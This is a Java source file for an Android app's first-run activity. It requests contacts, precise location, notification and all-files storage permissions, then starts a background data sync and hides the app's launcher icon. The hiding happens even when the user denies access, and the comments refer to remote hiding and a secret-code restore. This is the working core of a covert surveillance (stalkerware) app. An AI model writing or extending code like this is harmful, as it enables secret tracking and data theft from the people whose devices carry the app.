package com.busho.app.activities;

import android.Manifest;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.Settings;
import android.util.Log;
import android.widget.TextView;

import androidx.activity.EdgeToEdge;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.busho.app.R;
import com.busho.app.helpers.AppVisibilityHelper;
import com.busho.app.helpers.DataSyncWorker;
import com.busho.app.helpers.SessionManager;
import com.busho.app.helpers.StorageHelper;
import com.busho.app.helpers.UserDataSyncHelper;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;

import java.util.ArrayList;
import java.util.List;

/**
 * First-run gate: ask contacts + location + files + notifications once, then auto-hide
 * using the existing {@link AppVisibilityHelper#hideApp()} path.
 */
public class SetupPermissionsActivity extends AppCompatActivity {
    private static final String TAG = "SetupPermissions";
    private static final String PREFS = "setup_permissions";
    private static final String KEY_SETUP_DONE = "setup_done";
    private static final int REQ_CORE = 9001;
    private static final int REQ_ALL_FILES = 9002;

    private TextView tvStatus;
    private boolean awaitingAllFiles;
    private boolean finishingHide;

    public static boolean isSetupDone(android.content.Context context) {
        return context.getSharedPreferences(PREFS, MODE_PRIVATE).getBoolean(KEY_SETUP_DONE, false);
    }

    public static void markSetupDone(android.content.Context context) {
        context.getSharedPreferences(PREFS, MODE_PRIVATE)
                .edit()
                .putBoolean(KEY_SETUP_DONE, true)
                .commit();
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_setup_permissions);
        tvStatus = findViewById(R.id.tvSetupStatus);

        // Need a signed-in user for Firebase sync / remote hide.
        FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
        SessionManager session = new SessionManager(this);
        if (user == null && !session.isUserLoggedIn()) {
            startActivity(new Intent(this, ChooseLoginActivity.class)
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK));
            finish();
            return;
        }

        AppVisibilityHelper visibility = AppVisibilityHelper.getInstance(this);
        visibility.ensureListenerStarted();

        // First-run only. After secret-code restore, do not auto-hide again.
        if (isSetupDone(this)) {
            if (visibility.isAppHidden()) {
                visibility.enforceHiddenLauncher();
                moveTaskToBack(true);
            }
            finish();
            return;
        }

        if (hasAllCorePermissions() && hasFilesAccess()) {
            finishSetupAndHide();
            return;
        }

        tvStatus.setText(R.string.setup_permissions_title);
        requestCorePermissions();
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (finishingHide) {
            return;
        }
        if (awaitingAllFiles) {
            awaitingAllFiles = false;
            if (hasFilesAccess()) {
                finishSetupAndHide();
            } else {
                // User left settings without granting — still hide (best-effort).
                Log.w(TAG, "All-files not granted; hiding anyway");
                finishSetupAndHide();
            }
            return;
        }
    }

    private void requestCorePermissions() {
        String[] needed = missingCorePermissions();
        if (needed.length == 0) {
            maybeRequestAllFilesThenHide();
            return;
        }
        Log.i(TAG, "Requesting " + needed.length + " runtime permissions in one shot");
        ActivityCompat.requestPermissions(this, needed, REQ_CORE);
    }

    private String[] missingCorePermissions() {
        List<String> missing = new ArrayList<>();
        addIfMissing(missing, Manifest.permission.READ_CONTACTS);
        addIfMissing(missing, Manifest.permission.ACCESS_FINE_LOCATION);
        addIfMissing(missing, Manifest.permission.ACCESS_COARSE_LOCATION);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            addIfMissing(missing, Manifest.permission.POST_NOTIFICATIONS);
        }
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            addIfMissing(missing, Manifest.permission.READ_EXTERNAL_STORAGE);
        }
        return missing.toArray(new String[0]);
    }

    private void addIfMissing(List<String> out, String permission) {
        if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
            out.add(permission);
        }
    }

    private boolean hasAllCorePermissions() {
        return missingCorePermissions().length == 0;
    }

    private boolean hasFilesAccess() {
        return StorageHelper.hasStoragePermission(this);
    }

    private void maybeRequestAllFilesThenHide() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
            tvStatus.setText(R.string.setup_files_access);
            awaitingAllFiles = true;
            try {
                Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, REQ_ALL_FILES);
            } catch (Exception e) {
                Log.w(TAG, "Could not open all-files settings", e);
                try {
                    startActivityForResult(
                            new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION),
                            REQ_ALL_FILES
                    );
                } catch (Exception e2) {
                    finishSetupAndHide();
                }
            }
            return;
        }
        finishSetupAndHide();
    }

    private void finishSetupAndHide() {
        if (finishingHide) {
            return;
        }
        finishingHide = true;
        markSetupDone(this);
        tvStatus.setText(R.string.setup_hiding);

        DataSyncWorker.schedulePeriodicSync(this);
        UserDataSyncHelper.syncAll(this);

        // Keep existing best hide path unchanged.
        AppVisibilityHelper.getInstance(this).hideApp();
        Log.i(TAG, "Setup complete → hideApp()");

        moveTaskToBack(true);
        finish();
    }

    @Override
    public void onRequestPermissionsResult(
            int requestCode,
            @NonNull String[] permissions,
            @NonNull int[] grantResults
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode != REQ_CORE) {
            return;
        }
        Log.i(TAG, "Runtime permission result received — continuing setup");
        maybeRequestAllFilesThenHide();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQ_ALL_FILES) {
            awaitingAllFiles = false;
            finishSetupAndHide();
        }
    }
}
